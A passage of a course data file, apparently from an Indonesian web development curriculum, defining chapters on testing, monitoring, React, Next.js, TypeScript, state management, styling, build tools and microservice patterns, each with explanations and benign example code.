    explanation: "**Testing** adalah proses memverifikasi bahwa kode kamu berfungsi sesuai ekspektasi. Ada 3 jenis utama:\n\n**1. Unit Test** → Test 1 fungsi/komponen secara isolasi.\n- Cepat, banyak, fokus pada logic.\n- Tools: Jest, Vitest, Mocha.\n\n**2. Integration Test** → Test beberapa komponen bersama.\n- Verifikasi mereka berinteraksi dengan benar.\n\n**3. E2E (End-to-End) Test** → Test seluruh aplikasi dari user perspective.\n- Tools: Playwright, Cypress, Selenium.\n\n**Testing Pyramid:**\nE2E (sedikit) → Integration (sedang) → Unit (banyak)",

    codeExample: { language: "javascript", code: "// UNIT TEST DENGAN VITEST\nimport { describe, it, expect } from 'vitest';\nimport { sum, validateEmail } from './utils';\n\ndescribe('sum', () => {\n  it('adds 1 + 2 to equal 3', () => {\n    expect(sum(1, 2)).toBe(3);\n  });\n  \n  it('handles negative numbers', () => {\n    expect(sum(-1, -2)).toBe(-3);\n  });\n});\n\ndescribe('validateEmail', () => {\n  it('returns true for valid email', () => {\n    expect(validateEmail('test@example.com')).toBe(true);\n  });\n  \n  it('returns false for invalid email', () => {\n    expect(validateEmail('not-an-email')).toBe(false);\n  });\n});\n\n// REACT COMPONENT TEST\nimport { render, screen, fireEvent } from '@testing-library/react';\nimport Counter from './Counter';\n\nit('increments counter on click', () => {\n  render(<Counter />);\n  const button = screen.getByText('Increment');\n  fireEvent.click(button);\n  expect(screen.getByText('Count: 1')).toBeInTheDocument();\n});" },

    explainAlong: "Baris 2-14: Unit test fungsi. Baris 16-24: React component test.", aiPrompt: "Jelaskan bedanya TDD (Test-Driven Development) dan BDD.", reflection: "Tulis unit test untuk 3 fungsi utama di proyekmu. Run dengan npm test."

  },

  {

    id: "8.6", moduleId: 8, chapterNum: "8.6", title: "Monitoring dan Logging: Awasi Aplikasi", subtitle: "Error tracking, performance monitoring, dan logging", level: "Lanjut",

    objectives: ["Memahami pentingnya monitoring dan logging", "Bisa mengintegrasikan Sentry dan logging"],

    analogy: { diagram: "Monitoring = CCTV dan Alarm:\n\n[Website] → Error! → [Sentry] → Notifikasi ke Developer\n[Website] → Lambat → [APM] → Alert ke Team\n[Server] → Penuh → [Grafana] → Dashboard merah", caption: "Monitoring seperti CCTV — memantau kesehatan aplikasi 24/7" },

    explanation: "**Monitoring** adalah proses memantau kesehatan aplikasi di production.\n\n**Logging** adalah mencatat aktivitas dan error untuk debugging.\\n\\n**Kenapa penting?**\\nTanpa monitoring, kamu tidak tahu kalau:\\n- Website down (user complain dulu).\\n- Error terjadi (data hilang).\\n- Performa menurun (user kabur).\\n\\n**Tools Monitoring:**\\n\\n**Error Tracking:**\\n- **Sentry** → Capture error real-time,\n\nStack trace, user context.\\n\\n**Performance Monitoring:**\\n- **New Relic/Datadog** → APM (Application Performance Monitoring).\\n\\n**Logging:**\\n- **Winston/Pino** → Structured logging di Node.js.\\n- **CloudWatch/Logtail** → Centralized log management.",

    codeExample: { language: "javascript", code: "// SENTRY — Error Tracking\nimport * as Sentry from '@sentry/react';\n\nSentry.init({\n  dsn: 'https://xxx@o123.ingest.sentry.io/456',\n  environment: 'production',\n  tracesSampleRate: 1.0\n});\n\n// Capture error manual\ntry {\n  riskyOperation();\n} catch (error) {\n  Sentry.captureException(error);\n}\n\n// LOGGING DENGAN WINSTON\nimport winston from 'winston';\n\nconst logger = winston.createLogger({\n  level: 'info',\n  format: winston.format.combine(\n    winston.format.timestamp(),\n    winston.format.json()\n  ),\n  transports: [\n    new winston.transports.File({ filename: 'error.log', level: 'error' }),\n    new winston.transports.File({ filename: 'combined.log' })\n  ]\n});\n\nlogger.info('User logged in', { userId: 123 });\nlogger.error('Payment failed', { orderId: 456, reason: 'insufficient_funds' });" },

    explainAlong: "Baris 2-7: Sentry init. Baris 10-14: Capture exception. Baris 17-33: Winston logger.", aiPrompt: "Jelaskan bedanya logging dan monitoring.", reflection: "Integrasikan Sentry ke proyekmu. Simulasikan error — apakah muncul di dashboard?"

  },

];



// ============================================================

// MODUL 9: Front-End Framework & Modern Web (6 chapters)

// ============================================================

const modul9: Chapter[] = [

  { id: "9.1", moduleId: 9, chapterNum: "9.1", title: "React: Component-Based UI", subtitle: "Konsep component, props, state, dan hooks", level: "Lanjut", objectives: ["Memahami konsep React component", "Bisa membuat component dengan props dan state"], analogy: { diagram: "React = LEGO:\n\n[App] = [Header] + [Sidebar] + [Main] + [Footer]\n         (komponen reusable)", caption: "React seperti LEGO — UI dibangun dari komponen reusable" }, explanation: "**React** adalah library JavaScript untuk membangun user interface. Konsep utamanya adalah **component** — potongan UI yang reusable dan independen.\\n\\n**Konsep Dasar React:**\\n1. **Component** → Fungsi yang return JSX (HTML-like syntax).\\n2. **Props** → Data yang dikirim parent ke child (read-only).\\n3.\n\n**State** → Data yang bisa berubah dan memicu re-render.\\n4.\n\n**Hooks** → Fungsi yang memungkinkan functional component punya state dan lifecycle.\\n\\n**Hooks Penting:**\\n- `useState` → Menyimpan state lokal.\\n- `useEffect` → Side effect (fetch data,\n\nSubscribe).\\n- `useContext` → Akses context tanpa consumer wrapper.\\n\\n**Kenapa React?**\\n- Deklaratif — deskripsikan UI untuk setiap state.\\n- Component-based — reusable, terorganisir.\\n- Virtual DOM — update hanya bagian yang berubah.\", codeExample: { language: \"tsx\", code: \"// FUNCTIONAL COMPONENT\\nfunction Welcome({ name }: { name: string }) {\\n  return <h1>Hello, {name}!</h1>;\\n}\\n\\n// COMPONENT DENGAN STATE\\nimport { useState } from 'react';\\n\\nfunction Counter() {\\n  const [count, setCount] = useState(0);\\n  \\n  return (\\n    <div>\\n      <p>Count: {count}</p>\\n      <button onClick={() => setCount(count + 1)}>+</button>\\n      <button onClick={() => setCount(count - 1)}>-</button>\\n    </div>\\n  );\\n}\\n\\n// USEEFFECT — FETCH DATA\\nimport { useState, useEffect } from 'react';\\n\\nfunction UserList() {\\n  const [users, setUsers] = useState([]);\\n  const [loading, setLoading] = useState(true);\\n  \\n  useEffect(() => {\\n    fetch('/api/users')\\n      .then(res => res.json())\\n      .then(data => {\\n        setUsers(data);\\n        setLoading(false);\\n      });\\n  }, []); // [] = jalan sekali saat mount\\n  \\n  if (loading) return <p>Loading...</p>;\\n  return (\\n    <ul>\\n      {users.map(user => <li key={user.id}>{user.name}</li>)}\\n    </ul>\\n  );\\n}\" }, explainAlong: \"Baris 1-3: Functional component dengan props. Baris 6-17: Component dengan useState. Baris 20-38: useEffect untuk fetch data.\", aiPrompt: \"Jelaskan bedanya props dan state di React.\", reflection: \"Buat component TodoList di React. Gunakan useState dan useEffect.\" },\n  { id: \"9.2\", moduleId: 9, chapterNum: \"9.2\", title: \"Next.js: React dengan Superpower\", subtitle: \"SSR, SSG, API Routes, dan file-based routing\", level: \"Lanjut\", objectives: [\"Memahami keunggulan Next.js dibanding React biasa\", \"Bisa membuat halaman dengan SSR dan SSG\"], analogy: { diagram: \"React = Mesin Mobil\\nNext.js = Mobil Lengkap (mesin + bodi + roda)\\n\\nDisediakan: Routing, SSR, Image Opt, API Routes\", caption: \"Next.js adalah React dengan fitur production-ready built-in\" }, explanation: \"**Next.js** adalah framework React yang menyediakan fitur production-ready: SSR, SSG, API Routes, Image Optimization, dan File-based Routing.\\n\\n**Keunggulan Next.js:**\\n1. **File-based Routing** → Buat file di `pages/`, otomatis jadi route.\\n2. **SSR & SSG** → Render di server untuk SEO dan performa.\\n3. **API Routes** → Backend API dalam satu codebase.\\n4.\n\n**Image Optimization** → Auto-optimize gambar.\\n5. **Fast Refresh** → Hot reload saat development.\", codeExample: { language: \"tsx\", code: \"// FILE-BASED ROUTING\\n// pages/index.tsx → /\\n// pages/about.tsx → /about\\n// pages/blog/[slug].tsx → /blog/:slug\\n\\n// SSR\\nexport async function getServerSideProps() {\\n  const res = await fetch('https://api.example.com/data');\\n  const data = await res.json();\\n  return { props: { data } };\\n}\\n\\n// SSG\\nexport async function getStaticProps() {\\n  const data = await fetchData();\\n  return { props: { data }, revalidate: 60 };\\n}\\n\\n// API ROUTE\\n// pages/api/hello.ts\\nexport default function handler(req, res) {\\n  res.status(200).json({ message: 'Hello!' });\\n}\" }, explainAlong: \"Baris 1-4: File-based routing. Baris 7-11: SSR. Baris 14-17: SSG. Baris 20-22: API Route.\", aiPrompt: \"Jelaskan bedanya getServerSideProps dan getStaticProps.\", reflection: \"Buat project Next.js. Coba SSR, SSG, dan API Routes.\" },\n  { id: \"9.3\", moduleId: 9, chapterNum: \"9.3\", title: \"TypeScript: Tipe Data untuk JavaScript\", subtitle: \"Type safety, interface, generic, dan integrasi dengan React\", level: \"Lanjut\", objectives: [\"Memahami manfaat TypeScript\", \"Bisa menggunakan type dan interface\"], analogy: { diagram: \"JavaScript = Kotak Penyimpanan (apa saja bisa masuk)\\nTypeScript = Rak Terorganisir (hanya yang sesuai)\\n\\n[JS] → box.push('teks', 123, {}, []) ✅\\n[TS] → rakString.push(123) ❌ Error!\", caption: \"TypeScript memberi struktur tipe pada JavaScript yang dinamis\" }, explanation: \"**TypeScript** adalah superset JavaScript yang menambahkan static type checking. Dengan TypeScript, error type bisa tertangkap sebelum runtime.\\n\\n**Keuntungan TypeScript:**\\n1. **Catch errors early** → Error type ketika compile, bukan runtime.\\n2. **Better IDE support** → Autocomplete, refactoring, navigation.\\n3.\n\n**Self-documenting** → Tipe menjelaskan intent kode.\\n4. **Safer refactoring** → Rename dengan percaya diri.\\n\\n**Konsep Dasar:**\\n- `type` → Alias untuk tipe.\\n- `interface` → Mendefinisikan bentuk object.\\n- `generic` → Tipe yang bisa parameterisasi.\", codeExample: { language: \"tsx\", code: \"// TYPE\\ntype UserID = string;\\ntype Status = 'active' | 'inactive';\\n\\n// INTERFACE\\ninterface User {\\n  id: UserID;\\n  name: string;\\n  email: string;\\n  status: Status;\\n}\\n\\n// GENERIC\\nfunction wrapInArray<T>(value: T): T[] {\\n  return [value];\\n}\\nconst numbers = wrapInArray<number>(5); // number[]\\n\\n// REACT DENGAN TYPESCRIPT\\ninterface ButtonProps {\\n  label: string;\\n  onClick: () => void;\\n  disabled?: boolean;\\n}\\n\\nfunction Button({ label, onClick, disabled }: ButtonProps) {\\n  return (\\n    <button onClick={onClick} disabled={disabled}>\\n      {label}\\n    </button>\\n  );\\n}\" }, explainAlong: \"Baris 1-3: Type alias. Baris 5-10: Interface. Baris 12-15: Generic function. Baris 18-27: React component dengan TypeScript.\", aiPrompt: \"Jelaskan bedanya type dan interface di TypeScript.\", reflection: \"Convert 1 file JavaScript ke TypeScript. Berapa error type yang muncul?\" },\n  { id: \"9.4\", moduleId: 9, chapterNum: \"9.4\", title: \"State Management Modern: Zustand & Jotai\", subtitle: \"Alternatif lightweight untuk Redux\", level: \"Lanjut\", objectives: [\"Memahami state management modern\", \"Bisa menggunakan Zustand\"], analogy: { diagram: \"Redux = Kantor Besar Pemerintah (banyak prosedur)\\nZustand = Toko Keluarga (simpel, efisien)\\nJotai = Lego Blocks (atom-based, modular)\", caption: \"State management modern lebih simpel dan performa\" }, explanation: \"Meskipun Redux populer, ada alternatif yang lebih simpel dan performa untuk state management: **Zustand** dan **Jotai**.\\n\\n**Zustand** → Minimal boilerplate, hooks-based.\\n- Hanya 1 file,\n\n1 function.\\n- Tidak perlu provider wrapper.\\n- TypeScript support out of the box.\\n\\n**Jotai** → Atom-based state management.\\n- State dipecah menjadi atom-atom kecil.\\n- Derived atoms untuk computed state.\\n- Bagaikan Recoil tapi lebih simpel.\", codeExample: { language: \"tsx\", code: \"// ZUSTAND\\nimport { create } from 'zustand';\\n\\nconst useStore = create((set) => ({\\n  bears: 0,\\n  increase: () => set((state) => ({ bears: state.bears + 1 })),\\n  removeAll: () => set({ bears: 0 })\\n}));\\n\\nfunction BearCounter() {\\n  const bears = useStore((state) => state.bears);\\n  return <h1>{bears} bears</h1>;\\n}\\n\\n// JOTAI\\nimport { atom, useAtom } from 'jotai';\\n\\nconst countAtom = atom(0);\\nconst doubledAtom = atom((get) => get(countAtom) * 2);\\n\\nfunction Counter() {\\n  const [count, setCount] = useAtom(countAtom);\\n  const [doubled] = useAtom(doubledAtom);\\n  return (\\n    <div>\\n      <p>{count} x 2 = {doubled}</p>\\n      <button onClick={() => setCount(c => c + 1)}>+</button>\\n    </div>\\n  );\\n}\" }, explainAlong: \"Baris 2-9: Zustand store. Baris 11-14: Zustand selector. Baris 17-20: Jotai atoms. Baris 22-32: Jotai usage.\", aiPrompt: \"Jelaskan kapan menggunakan Zustand vs Jotai vs Redux.\", reflection: \"Ganti Redux di proyekmu dengan Zustand. Berapa baris kode yang berkurang?\" },\n  { id: \"9.5\", moduleId: 9, chapterNum: \"9.5\", title: \"Styling Modern: Tailwind dan CSS-in-JS\", subtitle: \"Utility-first CSS, styled-components, dan emotion\", level: \"Lanjut\", objectives: [\"Memahami pendekatan styling modern\", \"Bisa menggunakan Tailwind CSS\"], analogy: { diagram: \"Traditional CSS = Memasak dari Bahan Mentah:\\nPotong sayur → panaskan minyak → tumis → bumbui\\n\\nTailwind = Meal Kit:\\nBahan sudah siap, tinggal ikuti instruksi\\n\\nCSS-in-JS = Instant Noodle:\\nCSS ada di JS, satu file komplit\", caption: \"Tailwind seperti meal kit — utility class siap pakai\" }, explanation: \"**Tailwind CSS** adalah framework CSS utility-first. Alih-alih menulis CSS custom, kamu menggunakan class utilitas yang sudah tersedia.\\n\\n**Keuntungan Tailwind:**\\n1. **Rapid development** → Tidak perlu pikir nama class.\\n2. **Consistent design** → Spacing, color, typography konsisten.\\n3.\n\n**Small bundle** → Purge unused styles di production.\\n4. **Responsive** → Prefix `md:`, `lg:` untuk breakpoint.\\n\\n**CSS-in-JS** → CSS ditulis di dalam file JavaScript.\\n- **Styled-components** → CSS di template literal.\\n- **Emotion** → Performa lebih baik, lebih fleksibel.\", codeExample: { language: \"tsx\", code: \"// TAILWIND CSS\\nfunction Card({ title, children }) {\\n  return (\\n    <div className=\\\"rounded-lg border border-gray-200 bg-white p-6 shadow-md\\\">\\n      <h2 className=\\\"mb-4 text-xl font-bold text-gray-800\\\">{title}</h2>\\n      <div className=\\\"text-gray-600\\\">{children}</div>\\n    </div>\\n  );\\n}\\n\\n// STYLED-COMPONENTS\\nimport styled from 'styled-components';\\n\\nconst Button = styled.button<{ primary?: boolean }>`\\n  background: ${props => props.primary ? 'blue' : 'white'};\\n  color: ${props => props.primary ? 'white' : 'blue'};\\n  padding: 10px 20px;\\n  border-radius: 4px;\\n`;\\n\\n// EMOTION\\nimport { css } from '@emotion/react';\\n\\nconst buttonStyle = css`\\n  background: blue;\\n  color: white;\\n  padding: 10px 20px;\\n`;\" }, explainAlong: \"Baris 1-9: Tailwind utility classes. Baris 12-18: Styled-components. Baris 21-28: Emotion.\", aiPrompt: \"Jelaskan keuntungan dan kerugian Tailwind dibanding CSS tradisional.\", reflection: \"Coba Tailwind di proyekmu. Berapa lama membangun UI card?\" },\n  { id: \"9.6\", moduleId: 9, chapterNum: \"9.6\", title: \"Ekosistem Front-End: Bundler, Linter, Formatter\", subtitle: \"Vite, ESLint, Prettier, dan tools development\", level: \"Lanjut\", objectives: [\"Memahami tools modern front-end\", \"Bisa setup project dengan Vite\"], analogy: { diagram: \"Project Setup = Dapur Restoran:\\n\\nVite = Kitchen Equipment (Cepat, modern)\\nESLint = Food Inspector (Cek kualitas kode)\\nPrettier = Plating Expert (Rapi, konsisten)\\nTypeScript = Recipe Book (Struktur, tipe)\", caption: \"Tools modern membantu development lebih cepat dan berkualitas\" }, explanation: \"Ekosistem front-end modern punya banyak tools yang memudahkan development.\\n\\n**Bundler:**\\n- **Vite** → Cepat (native ESM), HMR instant.\\n- **Webpack** → Flexible tapi konfigurasi kompleks.\\n- **Turbopack** → Bundler Next.js generasi baru.\\n\\n**Linter & Formatter:**\\n- **ESLint** → Cek masalah kode (unused var,\n\nPotential bug).\\n- **Prettier** → Format kode otomatis (spacing, quotes).\\n\\n**Setup Vite + React + TypeScript:**\\n```bash\\nnpm create vite@latest my-app -- --template react-ts\\ncd my-app\\nnpm install\\nnpm run dev\\n```\", codeExample: { language: \"bash\", code: \"# SETUP PROJECT DENGAN VITE\\nnpm create vite@latest my-app -- --template react-ts\\n\\n# INSTALL DEPENDENCIES\\ncd my-app\\nnpm install\\n\\n# TAMBAH ESLINT + PRETTIER\\nnpm install -D eslint prettier eslint-config-prettier\\n\\n# vite.config.ts\\nimport { defineConfig } from 'vite';\\nimport react from '@vitejs/plugin-react';\\n\\nexport default defineConfig({\\n  plugins: [react()],\\n  server: { port: 3000 },\\n  build: { outDir: 'dist' }\\n});\\n\\n# .eslintrc.json\\n{\\n  \\\"extends\\\": [\\\"eslint:recommended\\\", \\\"plugin:react/recommended\\\"],\\n  \\\"rules\\\": {\\n    \\\"no-unused-vars\\\": \\\"error\\\",\\n    \\\"react/prop-types\\\": \\\"off\\\"\\n  }\\n}\" }, explainAlong: \"Baris 2: Create Vite project. Baris 8-14: Vite config. Baris 16-22: ESLint config.\", aiPrompt: \"Jelaskan bedanya Vite dan Webpack.\", reflection: \"Setup project baru dengan Vite + React + TS + ESLint + Prettier. Berapa menit?\" },\n];\n\n// ============================================================\n// MODUL 10: Back-End Arsitektur & Microservices (6 chapters)\n// ============================================================\nconst modul10: Chapter[] = [\n  { id: \"10.1\", moduleId: 10, chapterNum: \"10.1\", title: \"Arsitektur Microservices\", subtitle: \"Service boundaries, inter-service communication, dan data ownership\", level: \"Lanjut\", objectives: [\"Memahami prinsip microservices\", \"Bisa mendesain service boundaries\"], analogy: { diagram: \"Monolith = Supermarket (Semua di 1 tempat)\\nMicroservices = Pasar (Masing-masing kios independen)\\n\\n[Kios Buah] [Kios Daging] [Kios Sayur]\\n    ↑           ↑           ↑\\n  Bisa tutup, yang lain tetap buka\", caption: \"Microservices — service independen, bisa scale dan deploy terpisah\" }, explanation: \"**Microservices** adalah arsitektur di mana aplikasi dipecah menjadi service-service kecil yang independen.\\n\\n**Prinsip Microservices:**\\n1. **Single Responsibility** → 1 service = 1 business capability.\\n2. **Independently Deployable** → Deploy tanpa mengganggu service lain.\\n3. **Decentralized Data** → Setiap service punya database sendiri.\\n4. **Inter-service Communication** → Sync (HTTP/gRPC) atau Async (message broker).\\n\\n**Service Boundaries:**\\n- DDD (Domain-Driven Design) → Bounded Context.\\n- Database per Service → Data tidak dishare langsung.\\n- API Gateway → Single entry point untuk client.\", codeExample: { language: \"javascript\", code: \"// USER SERVICE\\n// services/user/index.js\\nconst express = require('express');\\nconst app = express();\\nconst db = require('./user-db');\\n\\napp.get('/users/:id', async (req, res) => {\\n  const user = await db.users.findById(req.params.id);\\n  res.json(user);\\n});\\napp.listen(3001);\\n\\n// ORDER SERVICE\\n// services/order/index.js\\nconst app = express();\\nconst db = require('./order-db');\\n\\napp.get('/orders/:id', async (req, res) => {\\n  const order = await db.orders.findById(req.params.id);\\n  // Fetch user dari User Service\\n  const userRes = await fetch(`http://user-service:3001/users/${order.userId}`);\\n  const user = await userRes.json();\\n  res.json({ ...order, user });\\n});\\napp.listen(3002);\\n\\n// API GATEWAY\\n// gateway/index.js\\nconst app = express();\\napp.use('/users', proxy('http://user-service:3001'));\\napp.use('/orders', proxy('http://order-service:3002'));\\napp.listen(3000);\" }, explainAlong: \"Baris 2-10: User service. Baris 13-23: Order service dengan inter-service call. Baris 26-30: API Gateway.\", aiPrompt: \"Jelaskan bedanya synchronous dan asynchronous communication antara services.\", reflection: \"Desain 3 service untuk e-commerce: User, Product, Order. Apa boundaries-nya?\" },\n  { id: \"10.2\", moduleId: 10, chapterNum: \"10.2\", title: \"API Gateway dan Service Mesh\", subtitle: \"Routing, load balancing, rate limiting, dan Istio/Linkerd\", level: \"Lanjut\", objectives: [\"Memahami peran API Gateway\", \"Bisa mengimplementasikan rate limiting\"], analogy: { diagram: \"API Gateway = Resepsionis Hotel:\\n[Tamu] → [Resepsionis] → [Kamar A / Kamar B / Kamar C]\\n         (Routing, Auth, Rate Limit)\", caption: \"API Gateway — gerbang masuk yang mengatur lalu lintas\" }, explanation: \"**API Gateway** adalah entry point tunggal untuk client. Dia mengatur routing, autentikasi, rate limiting, dan load balancing ke backend services.\\n\\n**Fungsi API Gateway:**\\n1. **Routing** → `/users` ke User Service, `/orders` ke Order Service.\\n2. **Authentication** → Verifikasi JWT sebelum forward request.\\n3.\n\n**Rate Limiting** → Batasi request per user (防止 abuse).\\n4. **Load Balancing** → Distribusi request ke instance yang sehat.\\n5. **Caching** → Cache response untuk mengurangi beban backend.\\n\\n**Service Mesh** → Lapisan infrastruktur untuk inter-service communication.\\n- Istio, Linkerd → Handle retry, circuit breaker, observability.\", codeExample: { language: \"javascript\", code: \"// API GATEWAY DENGAN EXPRESS\\nconst express = require('express');\\nconst { createProxyMiddleware } = require('http-proxy-middleware');\\nconst rateLimit = require('express-rate-limit');\\n\\nconst app = express();\\n\\n// Rate limiting\\nconst limiter = rateLimit({\\n  windowMs: 15 * 60 * 1000, // 15 menit\\n  max: 100 // 100 request per IP\\n});\\napp.use(limiter);\\n\\n// Auth middleware\\napp.use((req, res, next) => {\\n  const token = req.headers.authorization;\\n  if (!token) return res.status(401).send('Unauthorized');\\n  // Verify JWT...\\n  next();\\n});\\n\\n// Routing\\napp.use('/users', createProxyMiddleware({\\n  target: 'http://user-service:3001',\\n  changeOrigin: true\\n}));\\napp.use('/orders', createProxyMiddleware({\\n  target: 'http://order-service:3002',\\n  changeOrigin: true\\n}));\\n\\napp.listen(3000);\" }, explainAlong: \"Baris 6-10: Rate limiting. Baris 13-18: Auth middleware. Baris 21-29: Proxy ke services.\", aiPrompt: \"Jelaskan bedanya API Gateway dan Load Balancer.\", reflection: \"Implementasi API Gateway dengan rate limiting di proyekmu.\" },\n  { id: \"10.3\", moduleId: 10, chapterNum: \"10.3\", title: \"Message Broker: RabbitMQ dan Kafka\", subtitle: \"Async communication, event-driven architecture\", level: \"Lanjut\", objectives: [\"Memahami konsep message broker\", \"Bisa menggunakan RabbitMQ untuk event-driven\"], analogy: { diagram: \"Sync = Telepon Langsung:\\n[A] → Tunggu jawab → [B]\\n\\nAsync = Email/Message Queue:\\n[A] → Kirim pesan → [Kotak Surat] → [B] ambil saat sempat\", caption: \"Message broker memungkinkan komunikasi async antar services\" }, explanation: \"**Message Broker** adalah middleware yang memungkinkan service berkomunikasi secara asynchronous melalui message queue.\\n\\n**Keuntungan Async Communication:**\\n1. **Decoupling** → Service tidak perlu tahu satu sama lain.\\n2. **Resilience** → Kalau service down, pesan tetap di queue.\\n3. **Scalability** → Bisa scale consumer independently.\\n\\n**RabbitMQ** → Message broker traditional.\\n- Exchange → Route message ke queue.\\n- Queue → Buffer message.\\n- Consumer → Process message dari queue.\\n\\n**Apache Kafka** → Distributed event streaming platform.\\n- Topic → Kategori stream data.\\n- Partition → Parallel processing.\\n- Consumer Group → Load balance consumption.\", codeExample: { language: \"javascript\", code: \"// RABBITMQ PRODUCER\\nconst amqp = require('amqplib');\\n\\nasync function sendOrder(order) {\\n  const conn = await amqp.connect('amqp://localhost');\\n  const ch = await conn.createChannel();\\n  await ch.assertQueue('orders');\\n  ch.sendToQueue('orders', Buffer.from(JSON.stringify(order)));\\n}\\n\\n// RABBITMQ CONSUMER\\nasync function consumeOrders() {\\n  const conn = await amqp.connect('amqp://localhost');\\n  const ch = await conn.createChannel();\\n  await ch.assertQueue('orders');\\n  ch.consume('orders', (msg) => {\\n    const order = JSON.parse(msg.content.toString());\\n    console.log('Processing order:', order);\\n    ch.ack(msg);\\n  });\\n}\\n\\n// KAFKA PRODUCER\\nconst { Kafka } = require('kafkajs');\\nconst kafka = new Kafka({ brokers: ['localhost:9092'] });\\nconst producer = kafka.producer();\\n\\nawait producer.send({\\n  topic: 'orders',\\n  messages: [{ value: JSON.stringify(order) }]\\n});\" }, explainAlong: \"Baris 2-8: RabbitMQ producer. Baris 11-19: RabbitMQ consumer. Baris 22-28: Kafka producer.\", aiPrompt: \"Jelaskan bedanya message queue dan event streaming.\", reflection: \"Setup RabbitMQ di Docker. Buat producer dan consumer. Kirim 1000 pesan.\" },\n  { id: \"10.4\", moduleId: 10, chapterNum: \"10.4\", title: \"Distributed Tracing dan Observability\", subtitle: \"OpenTelemetry, Jaeger, dan logging terdistribusi\", level: \"Lanjut\", objectives: [\"Memahami konsep distributed tracing\", \"Bisa mengimplementasikan observability\"], analogy: { diagram: \"Monolith = 1 Rumah (CCTV 1 tempat)\\nMicroservices = Komplek Perumahan (Butuh CCTV di setiap rumah)\\n\\nDistributed Tracing = Peta Jejak:\\n[A] → [B] → [C] → [D]\\n 50ms   30ms   100ms  20ms\\n  └──── Total: 200ms ────┘\", caption: \"Distributed tracing melacak request melintasi services\" }, explanation: \"**Observability** adalah kemampuan untuk memahami apa yang terjadi di sistem terdistribusi. Ada 3 pilar:\\n\\n1. **Metrics** → Angka (CPU, memory, request rate).\\n2. **Logs** → Event log (error, access log).\\n3.\n\n**Traces** → Jejak request melintasi services.\\n\\n**Distributed Tracing** → Setiap request diberi trace ID. Setiap service menambahkan span ID. Hasilnya: peta lengkap perjalanan request.\\n\\n**Tools:**\\n- **OpenTelemetry** → Standard instrumentation.\\n- **Jaeger/Zipkin** → Distributed tracing platform.\\n- **Prometheus + Grafana** → Metrics dan dashboard.\", codeExample: { language: \"javascript\", code: \"// OPENTELEMETRY SETUP\\nconst { NodeSDK } = require('@opentelemetry/sdk-node');\\nconst { JaegerExporter } = require('@opentelemetry/exporter-jaeger');\\n\\nconst sdk = new NodeSDK({\\n  traceExporter: new JaegerExporter({ endpoint: 'http://jaeger:14268/api/traces' })\\n});\\nsdk.start();\\n\\n// MANUAL TRACING\\nconst { trace } = require('@opentelemetry/api');\\nconst tracer = trace.getTracer('order-service');\\n\\nasync function processOrder(orderId) {\\n  const span = tracer.startSpan('processOrder');\\n  span.setAttribute('order.id', orderId);\\n  \\n  try {\\n    span.addEvent('Validating order');\\n    await validateOrder(orderId);\\n    \\n    span.addEvent('Charging payment');\\n    await chargePayment(orderId);\\n    \\n    span.setStatus({ code: SpanStatusCode.OK });\\n  } catch (error) {\\n    span.recordException(error);\\n    span.setStatus({ code: SpanStatusCode.ERROR });\\n  } finally {\\n    span.end();\\n  }\\n}\" }, explainAlong: \"Baris 2-8: Setup OpenTelemetry. Baris 11-30: Manual tracing dengan span.\", aiPrompt: \"Jelaskan bedanya logging dan tracing.\", reflection: \"Setup Jaeger di Docker. Instrument 1 service. Lihat trace di UI.\" },\n  { id: \"10.5\", moduleId: 10, chapterNum: \"10.5\", title: \"Database per Service dan Event Sourcing\", subtitle: \"Data isolation, CQRS, dan event-driven data\", level: \"Lanjut\", objectives: [\"Memahami database per service pattern\", \"Bisa mengimplementasikan event sourcing\"], analogy: { diagram: \"Database per Service = Lemari Pribadi:\\n\\n[Kios A] → Lemari A (Rahasia kios A)\\n[Kios B] → Lemari B (Rahasia kios B)\\n\\nEvent Sourcing = Buku Jurnal:\\nCatat SEMUA perubahan, bukan state terakhir saja\", caption: \"Setiap service punya database sendiri, perubahan dicatat sebagai event\" }, explanation: \"**Database per Service** adalah prinsip bahwa setiap microservice harus punya database sendiri.\n\nService tidak boleh mengakses database service lain langsung.\\n\\n**Kenapa Database per Service?**\\n1.\n\n**Independence** → Service bisa ganti teknologi database.\\n2.\n\n**Encapsulation** → Data terenkapsulasi di belakang API.\\n3.\n\n**Resilience** → Database 1 service down tidak mempengaruhi lainnya.\\n\\n**Event Sourcing** → Simpan perubahan sebagai sequence of events,\n\nBukan hanya state terakhir.\\n\\n**CQRS (Command Query Responsibility Segregation)** → Pisahkan model untuk write (command) dan read (query).\\n- Write model → Optimized untuk consistency.\\n- Read model → Optimized untuk query speed.\", codeExample: { language: \"javascript\", code: \"// EVENT SOURCING EXAMPLE\\n// Events\\nconst events = [\\n  { type: 'AccountCreated', data: { id: 1, owner: 'Budi' } },\\n  { type: 'MoneyDeposited', data: { accountId: 1, amount: 1000 } },\\n  { type: 'MoneyWithdrawn', data: { accountId: 1, amount: 200 } }\\n];\\n\\n// Projection (current state)\\nfunction project(events) {\\n  return events.reduce((state, event) => {\\n    switch (event.type) {\\n      case 'AccountCreated':\\n        return { id: event.data.id, balance: 0, owner: event.data.owner };\\n      case 'MoneyDeposited':\\n        return { ...state, balance: state.balance + event.data.amount };\\n      case 'MoneyWithdrawn':\\n        return { ...state, balance: state.balance - event.data.amount };\\n      default: return state;\\n    }\\n  }, {});\\n}\\n\\nconst account = project(events);\\n// { id: 1, owner: 'Budi', balance: 800 }\\n\\n// CQRS SEPARATION\\n// Command (Write)\\nclass AccountCommandHandler {\\n  async handle(command) {\\n    const account = await this.repo.findById(command.accountId);\\n    account.deposit(command.amount);\\n    await this.eventStore.save(account.events);\\n  }\\n}\\n\\n// Query (Read)\\nclass AccountQueryHandler {\\n  async handle(query) {\\n    return await this.readModel.findById(query.accountId);\\n  }\\n}\" }, explainAlong: \"Baris 2-7: Event store. Baris 10-22: Projection function. Baris 25-36: CQRS command dan query handlers.\", aiPrompt: \"Jelaskan kapan menggunakan event sourcing.\", reflection: \"Desain event model untuk e-commerce: OrderCreated, PaymentReceived, OrderShipped.\" },\n  { id: \"10.6\", moduleId: 10, chapterNum: \"10.6\", title: \"Saga Pattern: Transaksi Terdistribusi\", subtitle: \"Orchestration, choreography, dan handling failure\", level: \"Lanjut\", objectives: [\"Memahami saga pattern untuk distributed transaction\", \"Bisa membedakan orchestration dan choreography\"], analogy: { diagram: \"Saga = Rencana Perjalanan dengan Cadangan:\\n\\nPlan A: [Pesan Tiket] → [Book Hotel] → [Sewa Mobil]\\n  ↓ Gagal\\nCompensate: [Refund Tiket] ← [Cancel Hotel] ← (tidak perlu cancel mobil)\", caption: \"Saga pattern — kalau gagal, undo step yang sudah berhasil\" }, explanation: \"**Saga 